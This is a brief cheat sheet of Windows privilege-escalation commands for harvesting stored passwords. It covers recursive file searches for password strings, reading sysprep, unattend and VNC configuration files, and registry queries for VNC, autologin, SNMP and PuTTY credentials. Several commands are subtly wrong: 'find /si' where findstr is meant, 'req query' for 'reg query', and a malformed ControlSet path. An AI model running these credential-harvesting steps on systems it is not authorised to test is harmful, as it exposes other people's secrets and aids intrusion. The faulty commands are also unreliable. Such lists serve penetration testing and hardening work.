# windows privesc via hardcoded passwords

### Search for password
```
find /si password *.txt
find /si password *.xml
find /si password *.ini
```

#### Find strings in files
```
dir /s *pass* == *cred* == *vnc* == *config*
```

#### Find passwords in all files
```
findstr /spin "password" *.*
```

### Read in files
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
```

### Read registry
```
- VNC
req query "HKCU\SOFTWARE\ORL\WinVNC3\Password"

- Windows autologin
req query "HKCU\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

- SNMP Parameters
req query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

- Putty
req query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions"
```

### Search in registry
```
req query HKLM /f password /t REG_SZ /s

req query HKCU /f password /t REG_SZ /s
```
